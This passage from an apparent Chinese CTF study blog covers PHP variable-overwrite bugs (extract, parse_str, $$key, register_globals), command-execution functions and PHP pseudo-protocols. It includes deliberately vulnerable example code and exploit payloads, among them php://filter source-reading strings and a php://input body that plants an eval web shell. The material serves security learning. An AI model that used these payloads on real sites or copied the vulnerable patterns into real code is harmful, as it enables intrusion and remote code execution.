href="https://blog.csdn.net/vhkjhwbs/article/details/100061332?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761784316780357294181%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161761784316780357294181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-100061332.pc_search_result_no_baidu_js&utm_term=%60register_globals=+CTF">变量覆盖参考</a></p><ul><li><p><strong>extract() 函数</strong>：<a href="https://www.php.net/extract"><strong>extract() 函数</strong></a></p><p><strong><code>EXTR_OVERWRITE</code></strong></p><p>​                     如果有冲突，覆盖已有的变量      </p><p><strong><code>EXTR_PREFIX_SAME</code></strong></p><p>​          如果有冲突，在变量名前加上前缀            </p><p><strong><code>EXTR_SKIP</code></strong></p><p>​                     如果有冲突，不覆盖已有的变量               </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$size</span> = <span class="string">&quot;large&quot;</span>;</span><br><span class="line"><span class="variable">$var_array</span> = <span class="keyword">array</span>(<span class="string">&quot;color&quot;</span> =&gt; <span class="string">&quot;blue&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;size&quot;</span>  =&gt; <span class="string">&quot;medium&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;shape&quot;</span> =&gt; <span class="string">&quot;sphere&quot;</span>);</span><br><span class="line">extract(<span class="variable">$var_array</span>, EXTR_PREFIX_SAME, <span class="string">&quot;wddx&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$color</span>, <span class="subst">$size</span>, <span class="subst">$shape</span>, <span class="subst">$wddx_size</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//将会输出 blue, large, sphere, medium，即没有覆盖掉变量$size</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/13/Z7UE8qQGLHypgno.png" alt="image-20210613155038606"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$size</span> = <span class="string">&quot;large&quot;</span>;</span><br><span class="line"><span class="variable">$var_array</span> = <span class="keyword">array</span>(<span class="string">&quot;color&quot;</span> =&gt; <span class="string">&quot;blue&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;size&quot;</span>  =&gt; <span class="string">&quot;medium&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;shape&quot;</span> =&gt; <span class="string">&quot;sphere&quot;</span>);</span><br><span class="line">extract(<span class="variable">$var_array</span>, EXTR_OVERWRITE);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$color</span>, <span class="subst">$size</span>, <span class="subst">$shape</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//将会输出 blue, medium, sphere，已经覆盖掉了$size</span></span><br></pre></td></tr></table></figure><p>那么当以上情况以 <code>extract($_GET)</code> 的形式出现时，就意味着用户可以直接覆盖掉变量了。</p></li><li><p>**trim(string,charlist)**：移除字符串两侧的空白字符或其他预定义字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解释：移除字符串两侧的字符（<span class="string">&quot;Hello&quot;</span> 中的 <span class="string">&quot;He&quot;</span> 以及 <span class="string">&quot;World&quot;</span> 中的 <span class="string">&quot;d!&quot;</span>）：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> trim(<span class="variable">$str</span>,<span class="string">&quot;Hed!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">相关函数：</span><br><span class="line">    ltrim() - 移除字符串左侧的空白字符或其他预定义字符</span><br><span class="line">    rtrim() - 移除字符串右侧的空白字符或其他预定义字符</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果charlist不写：默认移除</span><br><span class="line"> </span><br><span class="line">    <span class="string">&quot; &quot;</span> (ASCII <span class="number">32</span> (<span class="number">0x20</span>))，普通空格符。</span><br><span class="line">    <span class="string">&quot;\t&quot;</span> (ASCII <span class="number">9</span> (<span class="number">0x09</span>))，制表符。</span><br><span class="line">    <span class="string">&quot;\n&quot;</span> (ASCII <span class="number">10</span> (<span class="number">0x0A</span>))，换行符。</span><br><span class="line">    <span class="string">&quot;\r&quot;</span> (ASCII <span class="number">13</span> (<span class="number">0x0D</span>))，回车符。</span><br><span class="line">    <span class="string">&quot;\0&quot;</span> (ASCII <span class="number">0</span> (<span class="number">0x00</span>))，空字节符。</span><br><span class="line">    <span class="string">&quot;\x0B&quot;</span> (ASCII <span class="number">11</span> (<span class="number">0x0B</span>))，垂直制表符。</span><br></pre></td></tr></table></figure></li><li><p><strong>foreach() 遍历数组</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$name</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="comment">//传参  ?name=bbb</span></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">      <span class="variable">$$key</span> = <span class="variable">$val</span>;   <span class="comment">//将变成 $name = bbb</span></span><br><span class="line">  &#125;</span><br><span class="line">  var_dump(<span class="variable">$name</span>);  <span class="comment">//这样相当于将上面的$name的值通过我们的GET传参进行了修改</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;nishizuibangde!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$_403</span> = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line"><span class="variable">$_200</span> = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] !== <span class="variable">$flag</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210405172255909.png" alt="image-20210405172255909"></p></li><li><p>**parse_str()**：将查询的字符串解析为变量，如果未设置array参数，由该函数设置的变量将覆盖已存在的同名变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">解释：将查询的字符串解析为变量</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&quot;name=Bill&amp;age=60&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//输出： Bill </span></span><br><span class="line">    <span class="comment">//60 </span></span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;www.baidu.com&#x27;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">@parse_str(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="variable">$a</span>[<span class="number">0</span>]) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//WP:?id=a[0]=240610708</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/bkhsB9Wmdgt7Cje.png" alt="image-20210405173528242"></p><p>找md5的值是 科学技术法 0e开头的，根据 PHP弱类型的比较，0e开头均为0</p><p><a href="https://www.cnblogs.com/apolloren/p/14139516.html">md5 值是 0e 开头的</a></p></li><li><p>**import_request_variables()**：可以在 <code>register_global = off </code> 时，把 GET/POST/Cookie 变量导入全局作用域中</p><p><strong>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</strong></p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$auth</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">import_request_variables(<span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span> == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//输入 ?auth=1 </span></span><br><span class="line">    <span class="comment">//import_request_variables(&#x27;G&#x27;)指定导入GET请求中的变量，从而导致变量覆盖</span></span><br></pre></td></tr></table></figure></li><li><p><strong>全局变量注册开关问题</strong>：<code>register_globals=On/Off</code>，当是On的时候，传递过来的值会被直接注册为 <code>全局变量</code> 直接使用</p><p><a href="https://www.cnblogs.com/tr1ple/p/7295705.html">参考一</a></p><ul><li><strong>ini_get()  : 获取一个配置选项的值</strong></li></ul><p>例一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//?id=1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_globals: &quot;</span>.(<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_GET[&quot;id&quot;] :&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$id :&#x27;</span>.<span class="variable">$id</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/3E9buMmOSzWKwDQ.png" alt="image-20210405180500384"></p><p>例二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_globals: &quot;</span>.(<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;register_globals&#x27;</span>)) </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>) <span class="keyword">unset</span>($&#123;<span class="variable">$k</span>&#125;);  </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;  </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$_GET</span>[b];  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//?GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2 即可覆盖</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Register_globals:&quot;</span>.(<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;  </span><br><span class="line"> <span class="keyword">if</span> (ini_get(<span class="string">&#x27;register_globals&#x27;</span>)) <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>) <span class="keyword">unset</span>($&#123;<span class="variable">$k</span>&#125;);  </span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$a</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[b];  </span><br><span class="line"> <span class="meta">?&gt;</span> </span><br><span class="line">     <span class="comment">//输入 ?a=1&amp;b=2    unset($&#123;$k&#125;)的存在，无法覆盖</span></span><br><span class="line">     <span class="comment">//输入 ?GLOBALS[a]=1&amp;b=2  使用全局变量，即可覆盖</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="1-3-执行命令"><a href="#1-3-执行命令" class="headerlink" title="1.3 执行命令"></a>1.3 执行命令</h3><ul><li><p>**system()**：在执行外部命令时，直接将结果输出到浏览器，不需要使用echo或return来查看结果，</p></li><li><p>**passthru()**：直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p></li><li><p>**exec()**：执行系统外部命令时不会输出结果，而是返回结果的最后一行，需要使用echo等函数进行输出。如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> exec(<span class="string">&quot;ping 127.0.0.1&quot;</span>,<span class="variable">$file</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"> print_r(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210406215104620.png" alt="image-20210406215104620"></p></li><li><p><strong>shell_exec() 与 反引号</strong> <code>：shell_exec() 函数实际上仅是反引号(</code>)操作符的变体，都不会输出结果，需要使用echo等函数打印出结果。</p></li></ul><h2 id="二、PHP-伪协议"><a href="#二、PHP-伪协议" class="headerlink" title="二、PHP 伪协议"></a>二、PHP 伪协议</h2><p><a href="https://segmentfault.com/a/1190000018991087">PHP 伪协议 参考一</a></p><p><a href="https://my.oschina.net/u/4587690/blog/4451938">PHP 伪协议 参考二</a></p><p>PHP伪协议事实上就是支持的协议与封装协议</p><ul><li><strong>php://</strong> — 访问各个输入/输出流（I/O streams）</li></ul><p><strong>说明：</strong></p><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符、内存、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的 过滤器。  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">php:<span class="comment">//filter/read=string.rot13/resource=index.php</span></span><br></pre></td></tr></table></figure><h3 id="2-1-php-filter"><a href="#2-1-php-filter" class="headerlink" title="2.1 php://filter"></a>2.1 php://filter</h3><p>是一种元封装器，设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用</p><p>参数：</p><p><img src="https://i.loli.net/2021/07/09/WYhLxrPC7k35fQa.png" alt="image-20210405212210029"></p><p><strong>使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=&lt;待过滤的数据流&gt;</span><br><span class="line">php://filter/read=&lt;读 链需要应用的过滤器列表&gt;</span><br><span class="line">php://filter/write=&lt;写 链需要应用的过滤器列表&gt;  #可采用一个或以管道符 | 分隔的多个过滤器名称</span><br></pre></td></tr></table></figure><p>示例：</p><ul><li><strong>file_get_contents</strong> — 将整个文件读入一个字符串</li><li><strong>file_put_contents</strong> — 将一个字符串写入文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file1&#x27;</span>]; </span><br><span class="line"><span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file2&#x27;</span>]; </span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]; </span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file1</span>); </span><br><span class="line">file_put_contents(<span class="variable">$file2</span>,<span class="variable">$txt</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>利用：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取文件</span></span><br><span class="line">file1=php://filter/resource=file.txt  <span class="comment">#明文</span></span><br><span class="line">file1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=file.txt <span class="comment">#密文</span></span><br><span class="line">file1=php://filter/<span class="built_in">read</span>=string.rot13/resource=file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入文件</span></span><br><span class="line">?file2=php://filter/resource=test.txt&amp;txt=helloworld <span class="comment">#明文</span></span><br><span class="line">file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld  <span class="comment">#密文</span></span><br></pre></td></tr></table></figure><h3 id="2-2-php-input"><a href="#2-2-php-input" class="headerlink" title="2.2 php://input"></a>2.2 php://input</h3><ul><li><p><strong>php://input</strong> 是个可以访问请求的原始数据的只读流</p><p><code>enctype=&quot;multipart/form-data&quot;</code>  的时候  <code>php://input</code> 是无效的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?path=php:<span class="comment">//input</span></span><br><span class="line">&lt;POST 部分&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/M1lfqATbyk2zcjK.png" alt="image-20210406172715375"></p></li></ul><h3 id="2-3-file-协议"><a href="#2-3-file-协议" class="headerlink" title="2.3 file:// 协议"></a>2.3 file:// 协议</h3><p>通常用来 <strong>读取本地文件</strong> ，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code> 的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$path</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绝对路径</span></span><br><span class="line">?path=file:<span class="comment">//D:\phpstudy_pro\WWW\learn\phpin.php</span></span><br><span class="line">?path=file:<span class="comment">//D:/phpstudy_pro/WWW/learn/phpin.php</span></span><br><span class="line">?path=file:<span class="comment">///D:/phpstudy_pro/WWW/learn/phpin.php</span></span><br></pre></td></tr></table></figure><h3 id="2-4-http-协议"><a href="#2-4-http-协议" class="headerlink" title="2.4 http:// 协议"></a>2.4 http:// 协议</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=http:<span class="comment">//learn/phpin.php</span></span><br></pre></td></tr></table></figure><h3 id="2-5-php-协议"><a href="#2-5-php-协议" class="headerlink" title="2.5 php:// 协议"></a>2.5 php:// 协议</h3><p><strong>条件：</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><h3 id="2-6-zip-bzip2-zlib-协议"><a href="#2-6-zip-bzip2-zlib-协议" class="headerlink" title="2.6 zip://  bzip2://  zlib://  协议"></a>2.6 zip://  bzip2://  zlib://  协议</h3><p><a href="https://www.php.net/manual/zh/wrappers.compression.php">ip://  bzip2://  zlib://  协议</a></p><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p><ul><li><p><strong>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg </span></span><br><span class="line">?path=zip://D:\phpStudy_pro\WWW\learn\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/khzjdY1P2KqV8ND.png" alt="image-20210406175427085"></p><p><img 